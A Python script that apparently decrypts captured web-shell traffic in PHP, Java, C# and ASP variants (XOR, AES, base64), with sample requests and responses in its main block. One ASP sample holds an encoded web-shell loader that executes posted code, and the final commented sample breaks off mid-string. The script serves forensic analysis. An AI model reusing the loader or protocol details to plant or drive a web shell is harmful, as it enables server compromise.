import base64
import gzip
import re
from urllib.parse import unquote
from Crypto.Cipher import AES


def unpad(s):
    return s[:-ord(s[len(s) - 1:])]


def XOR(D, K):
    result = []
    for i in range(len(D)):
        c = K[i + 1 & 15]
        if not isinstance(D[i], int):
            d = ord(D[i])
        else:
            d = D[i]
        result.append(d ^ ord(c))
    return b''.join([i.to_bytes(1, byteorder='big') for i in result])


class PHP_XOR_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        payload = payload.decode().split(self.pass_ + '=')[1]
        return XOR(base64.b64decode(unquote(payload)), self.key)

    def decrypt_res_payload(self, payload):
        payload = payload[16:-16]
        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))


class PHP_XOR_RAW:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        return XOR(payload, self.key)

    def decrypt_res_payload(self, payload):
        return gzip.decompress(XOR(payload, self.key))


class PHP_EVAL_XOR_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        body = unquote(payload.decode())
        match = re.findall(r"eval\(base64_decode\(strrev\(urldecode\('(.*)'\)", str(body))
        # encode_body = regexphp(,body)
        tmp = reversed(match[0])
        tmp_base64 = ''.join(tmp)
        return base64.b64decode(tmp_base64)

    def decrypt_res_payload(self, payload):
        payload = payload[16:-16]
        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))


class JAVA_AES_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        payload = payload.decode().split(self.pass_ + '=')[1]
        encrypted_text = base64.b64decode(unquote(payload))

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        try:
            decrypted_text = gzip.decompress(decrypted_text)
        except:
            pass
        return decrypted_text

    def decrypt_res_payload(self, payload):
        payload = payload.decode()
        payload = payload[16:-16]
        encrypted_text = base64.b64decode(payload)

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        return gzip.decompress(decrypted_text)


class JAVA_AES_RAW:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        """"16进制字符串: d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60"""
        encrypted_text = payload

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        try:
            decrypted_text = gzip.decompress(decrypted_text)
        except:
            pass
        return decrypted_text

    def decrypt_res_payload(self, payload):
        encrypted_text = payload

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        return gzip.decompress(decrypted_text)


class CSHAP_AES_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        payload = payload.decode().split(self.pass_ + '=')[1]
        encrypted_text = base64.b64decode(unquote(payload))

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        try:
            decrypted_text = gzip.decompress(decrypted_text)
        except:
            pass
        return decrypted_text

    def decrypt_res_payload(self, payload):
        payload = payload.decode()
        payload = payload[16:-16]
        encrypted_text = base64.b64decode(payload)

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        return gzip.decompress(decrypted_text)


class CSHAP_EVAL_AES_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        body = unquote(payload.decode())
        match = re.findall(r"HttpUtility.UrlDecode\('(.*)'\)\)\)", str(body))
        tmp = match[0]
        decrypted_text = base64.b64decode(tmp)

        return decrypted_text

    def decrypt_res_payload(self, payload):
        payload = payload.decode()
        payload = payload[16:-16]
        encrypted_text = base64.b64decode(payload)

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        return gzip.decompress(decrypted_text)


class CSHAP_ASMX_AES_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        body = payload.decode()
        match = re.findall(r"<{}>(.*?)</{}>".format(self.pass_, self.pass_), str(body))

        encrypted_text = base64.b64decode(unquote(match[0]))

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        try:
            decrypted_text = gzip.decompress(decrypted_text)
        except:
            pass
        return decrypted_text

    def decrypt_res_payload(self, payload):
        body = payload.decode()
        match = re.findall(r"<{}Result>(.*?)</{}Result>".format(self.pass_, self.pass_), str(body))

        payload = match[0][16:-16]
        encrypted_text = base64.b64decode(payload)

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        return gzip.decompress(decrypted_text)


class CSHAP_AES_RAW:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        encrypted_text = payload

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        try:
            decrypted_text = gzip.decompress(decrypted_text)
        except:
            pass
        return decrypted_text

    def decrypt_res_payload(self, payload):
        encrypted_text = payload

        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())
        decrypted_text = cipher.decrypt(encrypted_text)
        decrypted_text = unpad(decrypted_text)
        return gzip.decompress(decrypted_text)


class ASP_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        payload = payload.decode().split(self.pass_ + '=')[1]
        return base64.b64decode(unquote(payload))

    def decrypt_res_payload(self, payload):
        payload = payload.decode()
        payload = payload[6:-6]
        return base64.b64decode((payload))


class ASP_EVAL_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        body = unquote(payload.decode())
        match = re.findall(r'bd\(""""(.*?)""""\)', str(body))
        tmp = bytes(bytearray.fromhex(match[0]))
        return tmp

    def decrypt_res_payload(self, payload):
        payload = payload[6:-6]
        return base64.b64decode((payload))


class ASP_RAW:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        return payload

    def decrypt_res_payload(self, payload):
        return payload


class ASP_XOR_BASE64:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        payload = payload.decode().split(self.pass_ + '=')[1]
        return XOR(base64.b64decode(unquote(payload)), self.key)

    def decrypt_res_payload(self, payload):
        payload = payload.decode()
        payload = payload[6:-6]
        return XOR(base64.b64decode(payload), self.key)


class ASP_XOR_RAW:
    def __init__(self, pass_, key):
        self.pass_ = pass_
        self.key = key

    def decrypt_req_payload(self, payload):
        return XOR(payload, self.key)

    def decrypt_res_payload(self, payload):
        return XOR(payload, self.key)


if __name__ == '__main__':
    decrypter = PHP_XOR_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b'pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==')
    print(data)
    data = decrypter.decrypt_res_payload(b'72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488')
    print(data)

    # php_xor_raw_req = '0e5311580d5c2f580e54373632346147064511'
    # php_xor_raw_res = '7cbd6d3062386139633bfefd343426eebf4f67306238'
    # decrypter = PHP_XOR_RAW(pass_='pass', key='3c6e0b8a9c15224a')
    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(php_xor_raw_req)))
    # print(data)
    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(php_xor_raw_res)))
    # print(data)

    # decrypter = PHP_EVAL_XOR_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    # data = decrypter.decrypt_req_payload(b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D')
    # print(data)
    # exit()
    # data = decrypter.decrypt_res_payload(b'72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488')
    # print(data)


    # decrypter = JAVA_AES_RAW(pass_='pass', key='3c6e0b8a9c15224a')
    # java_raw_req = 'd26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60'
    # java_raw_res = '2c5fc8a643ef334889238c26a41b360daa0156f71b0cca70b8bee7612de7fe4e'
    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(java_raw_req)))
    # print(data)
    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(java_raw_res)))
    # print(data)

    decrypter = JAVA_AES_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b'pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g')
    print(data)
    data = decrypter.decrypt_res_payload(
        b'11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC')
    print(data)


    decrypter = ASP_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b"pass=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D")
    print(data)
    data = decrypter.decrypt_res_payload(b"11cd6ab2s=ac826a")
    print(data)

    decrypter = ASP_RAW(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b"methodName\x02\x04\x00\x00\x00test")
    print(data)
    data = decrypter.decrypt_res_payload(b"ok")
    print(data)

    decrypter = ASP_EVAL_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b"pass=eval%28%22Ex%22%26cHr%28101%29%26%22cute%28%22%22Server.ScriptTimeout%3D3600%3AOn+Error+Resume+Next%3AFunction+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function%3AEx%22%26cHr%28101%29%26%22cute%28%22%22%22%22On+Error+Resume+Next%3A%22%22%22%22%26bd%28%22%22%22%220d0a5365742062797061737344696374696f6e617279203d205365727665722e4372656174654f626a6563742822536372697074696e672e44696374696f6e61727922290d0a0d0a46756e6374696f6e204261736536344465636f646528427956616c2076436f6465290d0a2020202044696d206f584d4c2c206f4e6f64650d0a20202020536574206f584d4c203d204372656174654f626a65637428224d73786d6c322e444f4d446f63756d656e742e332e3022290d0a20202020536574206f4e6f6465203d206f584d4c2e437265617465456c656d656e74282262617365363422290d0a202020206f4e6f64652e6461746154797065203d202262696e2e626173653634220d0a202020206f4e6f64652e74657874203d2076436f64650d0a202020204261736536344465636f6465203d206f4e6f64652e6e6f6465547970656456616c75650d0a20202020536574206f4e6f6465203d204e6f7468696e670d0a20202020536574206f584d4c203d204e6f7468696e670d0a456e642046756e6374696f6e0d0a0d0a46756e6374696f6e2064656372797074696f6e28636f6e74656e742c697342696e290d0a2020202064696d2073697a652c692c726573756c742c6b657953697a650d0a202020206b657953697a65203d206c656e286b6579290d0a202020205365742042696e61727953747265616d203d204372656174654f626a656374282241444f44422e53747265616d22290d0a2020202042696e61727953747265616d2e43686172536574203d202269736f2d383835392d31220d0a2020202042696e61727953747265616d2e54797065203d20320d0a2020202042696e61727953747265616d2e4f70656e0d0a202020206966204973417272617928636f6e74656e7429207468656e0d0a202020202020202073697a653d55426f756e6428636f6e74656e74292b310d0a2020202020202020466f7220693d3120546f2073697a650d0a20202020202020202020202042696e61727953747265616d2e57726974655465787420636872772861736362286d69646228636f6e74656e742c692c312929290d0a20202020202020204e6578740d0a20202020656e642069660d0a2020202042696e61727953747265616d2e506f736974696f6e203d20300d0a20202020696620697342696e207468656e0d0a202020202020202042696e61727953747265616d2e54797065203d20310d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e5265616428290d0a20202020656c73650d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e526561645465787428290d0a20202020656e642069660d0a0d0a456e642046756e6374696f6e0d0a20202020636f6e74656e743d726571756573742e466f726d28226b657922290d0a202020206966206e6f74204973456d70747928636f6e74656e7429207468656e0d0a0d0a2020202020202020696620204973456d7074792853657373696f6e28227061796c6f6164222929207468656e0d0a202020202020202020202020636f6e74656e743d64656372797074696f6e284261736536344465636f646528636f6e74656e74292c66616c7365290d0a20202020202020202020202053657373696f6e28227061796c6f616422293d636f6e74656e740d0a202020202020202020202020726573706f6e73652e456e640d0a2020202020202020656c73650d0a202020202020202020202020636f6e74656e743d4261736536344465636f646528636f6e74656e74290d0a20202020202020202020202062797061737344696374696f6e6172792e41646420227061796c6f6164222c53657373696f6e28227061796c6f616422290d0a202020202020202020202020457865637574652862797061737344696374696f6e61727928227061796c6f61642229290d0a202020202020202020202020726573756c743d72756e28636f6e74656e74290d0a202020202020202020202020726573706f6e73652e5772697465282238323831333022290d0a2020202020202020202020206966206e6f74204973456d70747928726573756c7429207468656e0d0a20202020202020202020202020202020726573706f6e73652e577269746520426173653634456e636f64652864656372797074696f6e28726573756c742c7472756529290d0a202020202020202020202020656e642069660d0a202020202020202020202020726573706f6e73652e5772697465282232306562626322290d0a2020202020202020656e642069660d0a20202020656e642069660d0a0d0a%22%22%22%22%29%29%3AResponse.End%22%22%29%22%29%0D%0A&key=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D")
    print(data)
    data = decrypter.decrypt_res_payload(b"828130b2s=20ebbc")
    print(data)


    decrypter = ASP_XOR_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    data = decrypter.decrypt_req_payload(b"pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D")
    print(data)
    data = decrypter.decrypt_res_payload(b"11cd6aDF0=ac826a")
    print(data)

    decrypter = ASP_XOR_RAW(pass_='pass', key='3c6e0b8a9c15224a')
    asp_xor_raw_req = '0e5311580d5c2f580e54373632346147064511'
    asp_xor_raw_res = '0c5d'
    data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(asp_xor_raw_req)))
    print(data)
    data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(asp_xor_raw_res)))
    print(data)

    # decrypter = CSHAP_AES_BASE64(pass_='pass', key='3c6e0b8a9c15224a')
    # data = decrypter.decrypt_req_payload(b'pass=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